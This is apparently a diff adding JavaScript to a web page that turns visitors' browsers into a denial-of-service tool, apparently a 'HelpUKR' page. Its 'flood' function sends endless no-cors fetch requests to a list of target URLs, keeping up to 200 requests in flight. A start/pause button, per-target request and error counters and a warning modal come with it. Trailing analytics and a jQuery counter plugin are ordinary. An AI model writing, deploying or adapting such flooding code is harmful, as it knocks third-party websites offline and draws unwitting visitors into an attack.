+        // initialize variables
+        var targets = urls.reduce((o, key) => ({ ...o, [key]: {number_of_requests: 0, number_of_errored_responses: 0}}), {})
+        var statRow = document.querySelector("#stats > .row");
+        var myModal = new bootstrap.Modal(document.getElementById('HelpUKR-WarningBox'), {});
+        var CONCURRENCY_LIMIT = 200;
+        var queue = [];
+        var attack = false;
+        var totalrequests = 0;
+        var totalerrors = 0;
+        function togglePause () {
+            if (attack) {
+                attack = false;
+                document.querySelector("div.desc .btn").innerText = "Resume";
+            } else {
+                attack = true;
+                document.querySelector("div.desc .btn").innerText = "Pause";
+                for (var i=0; i<urls.length; i++) {
+                    flood(i);
+                }
+            }
+        }
+        async function fetchWithTimeout(resource, options) {
+            const controller = new AbortController();
+            const id = setTimeout(() => controller.abort(), options.timeout);
+            return fetch(resource, {
+                signal: controller.signal,
+                mode: 'no-cors'
+            }).then((response) => {
+                clearTimeout(id);
+                return response;
+            }).catch((error) => {
+                clearTimeout(id);
+                throw error;
+            });
+        }
+        async function sleep(ms) {
+            return new Promise(r => setTimeout(r, ms));
+        }         
+        async function flood(n) {
+            const url = urls[n];
+            const target = targets[url];
+            while (attack) {
+                if (queue.length > CONCURRENCY_LIMIT) {
+                    await queue.shift();
+                }
+                queue.push(
+                    fetchWithTimeout(url, { timeout: 2000 })
+                        .catch((error) => {
+                            if (error.code === 20 /* ABORT */) {
+                                return;
+                            }
+                            target.number_of_errored_responses++;
+                            target.error_message = error.message;
+                            totalerrors++;
+                        })
+                        .then((response) => {
+                            if (response && !response.ok) {
+                                target.number_of_errored_responses++;
+                                target.error_message = response.statusText;
+                                totalerrors++;
+                            }
+                            target.number_of_requests++;
+                        })
+                        .finally(() => updateTargetDisplay(n))
+                );
+                await sleep(1);
+            }
+        }
+        // Update data for target n
+        function updateTargetDisplay(n) {
+            var url = urls[n];
+            var {number_of_requests, number_of_errored_responses} = targets[url];
+            var requests_cell = document.querySelector(`#target${n} .requests`);
+            var errors_cell = document.querySelector(`#target${n} .errors`);
+            requests_cell.innerText = number_of_requests;
+            errors_cell.innerText = number_of_errored_responses;
+            document.querySelector("#totalrequests").innerText = totalrequests;
+            document.querySelector("#totalerrors").innerText = totalerrors;
+        }
+        // Shuffle array order before starting
+        for (let i = urls.length - 1; i > 0; i--) {
+            const j = Math.floor(Math.random() * (i + 1));
+            [urls[i], urls[j]] = [urls[j], urls[i]];
+        }
+        // Create div for each target
+        for (var i=0; i<urls.length; i++) {
+            statRow.innerHTML += `
+                <div class="col-lg-3 col-md-4 col-sm-6" id="target${i}">
+                  <h4>${urls[i]}</h4>
+                    <table class='status'>
+                      <tr><td>requests:</td><td class="requests">0</td></tr>
+                      </tr><td>errors:</td><td class="errors">0</td></tr>
+                    </table>
+                  </div>
+            `;
+        }
+        // Show warning window
+        myModal.toggle();
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'UA-85513613-1');
+</script>
+<script>
+// BETA plugin for estimated requested data
+(function($) {
+  $.fn.countTo = function(options) {
+    return this.each(function() {
+      //-- Arrange
+      var FRAME_RATE = 60; // Predefine default frame rate to be 60fps
+      var $el = $(this);
+      var countFrom = parseInt($el.attr('data-count-from'));
+      var countTo = parseInt($el.attr('data-count-to'));
+      var countSpeed = $el.attr('data-count-speed'); // Number increment per second
+
+      //-- Action
+      var rafId;
+      var increment;
+      var currentCount = countFrom;
+      var countAction = function() {              // Self looping local function via requestAnimationFrame
+        if(currentCount < countTo) {              // Perform number incremeant
+          $el.text(Math.floor(currentCount));     // Update HTML display
+          increment = countSpeed / FRAME_RATE;    // Calculate increment step
+          currentCount += increment;              // Increment counter
+          rafId = requestAnimationFrame(countAction);
+        } else {                                  // Terminate animation once it reaches the target count number
+          $el.text(countTo);                      // Set to the final value before everything stops
+          //cancelAnimationFrame(rafId);
+        }
+      };
+      rafId = requestAnimationFrame(countAction); // Initiates the looping function
+    });
+  };
+}(jQuery));
+
+//-- Executing
+$('.number-counter').countTo();
+</script>
+</html>
